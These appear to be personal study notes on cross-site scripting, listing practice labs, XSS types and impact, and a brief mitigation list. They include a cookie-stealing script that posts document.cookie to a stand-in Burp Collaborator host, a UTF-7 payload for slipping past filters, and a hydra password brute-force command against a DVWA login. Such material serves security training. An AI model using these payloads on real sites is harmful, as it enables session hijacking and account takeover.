Learning Platforms: 
 >> 1. PortSwigger XSS Labs
 >> 2. Google XSS Game
 >> 3. Alert(1) to Win
 >> 6. cure53 XSS Challenges
 >> 7. XSS Gym & XSS Practice Labs by Brutelogic
 >> 8. XSS by PwnFunction
 >> 9. XSS Game  :xssgame.com
 


>XSS (cross site scripting)
  Cross-site scripting works by manipulating a vulnerable web site so that it returns malicious JavaScript to   users. When the malicious code executes inside a victim's browser, the attacker can fully compromise their interaction with the application. 



>How to identify XSS
  invoking alert() in a simulated victim's browser.
  recommend the print() function.

>Types:
    Reflected XSS: where the malicious script comes from the current HTTP request.
    Stored XSS: where the malicious script comes from the website's database.
    DOM-based XSS: where the vulnerability exists in client-side code rather than server-side code.
============================================================================================

>Reflected: 
  when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way. 

>Impact of reflected XSS attacks
    Perform any action within the application that the user can perform.
    View any information that the user is able to view.
    Modify any information that the user is able to modify.
    Initiate interactions with other application users, including malicious attacks, that will appear to originate from the initial victim user.

>Exploiting XSS to steal cookies: 
  Limitations:
    The victim might not be logged in.
    Many applications hide their cookies from JavaScript using the HttpOnly flag.
    Sessions might be locked to additional factors like the user's IP address.
    The session might time out before you're able to hijack it.

Below is the script that can be used to do out of band attacks for stealing cookies using XSS:

<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
}); 
</script>

>>cross site scripting to bypass WAF and checks
+ADw-script+AD4-alert(1);+ADw-/script+AD4




brute force using hydra::
hydra -l admin -P /usr/share/wordlists/rockyou.txt -V 192.168.18.128 http-post-form "/dvwa/login.php:username=admin&password=^PASS^&Login=Login:NA"
====================================================================================================================================================


how to find stored and reflected XSS:
1. where the data is going ? Does it get embedded in a tag attribute? Does it get embedded into a string in a script.
2. Figure out any special handling : Do url's get turned into links  , like posts in level1.
3.Figure out how characters are being handeled. like <>; etc.
 
Mitigation:
1. escape characters
2. put input in some fields/
















